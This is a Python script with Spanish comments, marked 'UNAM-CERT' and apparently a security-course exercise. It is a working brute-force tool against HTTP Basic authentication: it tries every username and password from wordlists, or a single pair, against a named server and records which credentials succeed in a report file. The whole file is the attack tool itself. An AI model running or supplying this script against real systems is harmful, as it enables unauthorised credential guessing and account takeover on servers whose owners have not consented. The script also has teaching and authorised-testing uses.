#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT

#Para ejecutar
# Archivo de usuarios y archivo de contraseñas
#python req.py -s servidor -f -U archivo_usuarios -P archivo_password -r archivo_reporte -v (-v para modo verboso) 
# Un usuario y una contraseña:
#python req.py -s servidor -U usuario -P contraseña -r archivo_reporte -v (-v para modo verboso) 

import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-v', '--verbose',action='store_true', dest='verbose', default=False, help='Mode verbose')
    parser.add_option('-r', '--report', dest='report', default=None, help='Bandera para indicar el archivo donde se imprimirán los resultados')
    parser.add_option('-f', '--file',action='store_true', dest='file', default=False, help='Bandera para indicar si los usuarios y contraseñas están en un archivo ')
    # parser.add_option('-o', '--one',action='store_true', dest='one', default=False, help='Bandera para indicar si solo se quiere un usuario y una contraseña')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
# 

def reportResults(archivo,resultados):
    with open(archivo,"w") as file:
        file.write("Resultados de usuarios y contraseñas utilizados\n\n")
        for res in resultados:
            file.write("usuario: %8s  contraseña: %10s -> %s \n" % (res[0],res[1],res[2]))
            

def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password):
    try:
        response = get(host, auth=(user,password))
        #print response
        #print dir(response)
        if response.status_code == 200:
            # print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            return True
        else:
            # print 'NO FUNCIONO :c '
            return False
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    try:
        resultados=[]
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        if opts.file:
            with open(opts.password) as passwords, open(opts.user) as users:
                for us in users:
                    passwords.seek(0)
                    for pas in passwords:
                        if opts.verbose:
                            print("Intentando usuario: "+us[:-1]+" contraseña: "+pas[:-1])
                            if makeRequest(url, us[:-1], pas[:-1]):
                                resultados.append((us[:-1], pas[:-1],"Funciono"))
                            else:
                                resultados.append((us[:-1], pas[:-1],"No funciono"))
                        else:
                            if makeRequest(url, us[:-1], pas[:-1]):
                                resultados.append((us[:-1], pas[:-1],"Funciono"))
                            else:
                                resultados.append((us[:-1], pas[:-1],"No funciono"))
            reportResults(opts.report, resultados)
        else:
            if opts.verbose:
                print("Intentando usuario: "+opts.user+" contraseña: "+opts.password)
                if makeRequest(url, opts.user, opts.password):
                    resultados.append((opts.user, opts.password,"Funciono"))
                else:
                    resultados.append((opts.user, opts.password,"No funciono")) 
            else:
                if makeRequest(url, opts.user, opts.password):
                    resultados.append((opts.user, opts.password,"Funciono"))
                else:
                    resultados.append((opts.user, opts.password,"No funciono"))
            reportResults(opts.report, resultados)

    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
